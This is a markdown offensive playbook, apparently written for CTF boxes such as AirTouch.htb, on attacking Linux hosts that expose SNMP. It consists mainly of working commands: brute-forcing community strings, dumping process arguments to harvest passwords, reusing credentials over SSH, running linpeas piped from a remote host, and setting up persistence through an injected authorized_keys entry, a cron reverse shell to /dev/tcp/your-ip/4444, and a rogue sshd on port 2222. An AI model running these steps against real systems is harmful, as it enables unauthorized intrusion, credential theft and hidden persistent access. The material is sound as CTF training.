# Archetype: Linux Host with SNMP

**Match if you see:** UDP 161 open, Linux banners on TCP, SNMP responses to
default community strings.

This is exactly the AirTouch.htb pattern.

## Fast checks (≤ 5 min)

```bash
# 1) Default community strings
snmpwalk -v2c -c public target | head -50
snmpwalk -v2c -c private target | head -50
snmpwalk -v1 -c public target | head -50

# 2) onesixtyone for community brute force (fast)
echo public > /tmp/comm.txt; echo private >> /tmp/comm.txt; echo community >> /tmp/comm.txt
onesixtyone -c /tmp/comm.txt target

# 3) snmpwalk full dump if community works
snmpwalk -v2c -c public target > /tmp/snmp-dump.txt
wc -l /tmp/snmp-dump.txt

# 4) Specific juicy OIDs
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.4.2.1.2     # running processes
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.4.2.1.5     # process args (PASSWORDS HERE)
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.6.3.1.2     # installed software
snmpwalk -v2c -c public target 1.3.6.1.4.1.77.1.2.25      # local users (Windows-style)
snmpwalk -v2c -c public target 1.3.6.1.2.1.6.13.1.3       # listening TCP ports
```

## The credential-leak pattern (AirTouch)

The biggest SNMP win is **process args**. People put passwords on command
lines all the time:

```bash
snmpwalk -v2c -c public target 1.3.6.1.2.1.25.4.2.1.5 \
  | grep -iE "(pass|secret|key|token|cred)" -i
```

You'll often see things like:
```
HOST-RESOURCES-MIB::hrSWRunParameters.1234 = "--password=RxBlZh..."
```
That's your credential.

## Deep checks

### A. Full enumeration
```bash
# Everything SNMP can tell you
snmpwalk -v2c -c <community> target -O e > /tmp/full.txt

# Categorize:
grep "Process" /tmp/full.txt
grep "User" /tmp/full.txt
grep "Software" /tmp/full.txt
grep "TCP" /tmp/full.txt
```

### B. SNMP write access (less common but devastating)
```bash
# If write community works → can change config, including injecting cron-like
# tasks via Net-SNMP extend
snmpset -v2c -c <write-community> target <OID> <type> <value>
```

### C. Once you have creds → cred reuse
Try the leaked password against:
- SSH (`ssh user@target`)
- The local web app if any
- FTP, SMB, anything else open

This is the AirTouch winning play.

## Post-access on a Linux SNMP host

After SSH:
```bash
# 1) sudo first — ALWAYS
sudo -l                                # AirTouch had (ALL) NOPASSWD: ALL → instant root

# 2) Standard linpeas / linenum
curl -s http://your-ip/linpeas.sh | sh

# 3) Check for wireless / network gear (these hosts are often network boxes)
iw dev
ip a
nmcli dev
sudo airmon-ng
```

## The AirTouch lesson — DO NOT lose access

Once on the box, **before any network pivot** (especially WiFi / VPN
connections):

```bash
# Always create a backup access path BEFORE risking the SSH session
# 1) Add an authorized_keys entry
echo "<your-pub-key>" >> ~/.ssh/authorized_keys

# 2) Drop a reverse shell cron as a fallback
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/your-ip/4444 0>&1'") | crontab -

# 3) If root: open a second SSH on a non-standard port
sudo /usr/sbin/sshd -p 2222 &

# 4) NOW pivot
```

This is the lesson from AirTouch — connecting to the WiFi broke SSH,
and we lost the box without a fallback.

## Common pitfalls

1. **Trying only `public`** — `private`, `community`, `manager` are all common.
2. **Stopping at "yes there's SNMP"** — the `hrSWRunParameters` OID is where
   the gold is. Always grep process args for password keywords.
3. **Not trying SNMPv3** — if v1/v2c are blocked, v3 is sometimes still
   listening with weak userauth.
4. **Network pivot without fallback access** — see "AirTouch lesson" above.

## Pivot targets

- Process args (`1.3.6.1.2.1.25.4.2.1.5`) — passwords/tokens on command lines
- `/etc/snmp/snmpd.conf` — community strings, ACLs, possibly other secrets
- Any service whose config got dumped via SNMP — they often share creds with SSH
